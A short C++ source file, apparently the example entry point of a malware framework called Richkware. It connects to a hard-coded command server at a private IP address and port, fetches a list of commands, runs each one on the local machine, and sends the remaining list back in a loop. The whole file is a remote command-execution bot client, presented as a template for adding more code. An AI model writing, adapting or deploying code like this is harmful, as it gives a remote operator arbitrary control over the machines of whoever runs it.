/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#include "src/richkware.h"
#include "src/utils.h"


int main() {
    // with RichkwareManagerServer
    Richkware richkware("Richk","richktest","172.17.238.81", "8080", "er@fv.it");
    // without RichkwareManagerServer
    //Richkware richkware("Richk","richktest");

    // PUT YOUR CODE HERE
//    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
//    richkware.executeCommands();
    std::vector<std::string> commands = richkware.updateCommands("172.17.238.81", "8080", "er@fv.it", "");

    for (size_t i = 0; i < commands.size(); ++i) {
        richkware.executeCommand(commands.at(i));
        commands.pop_back();
        commands = richkware.updateCommands("172.17.238.81", "8080", "er@fv.it", utils::concatVector(commands, "##"));
    }
    return 0;

}

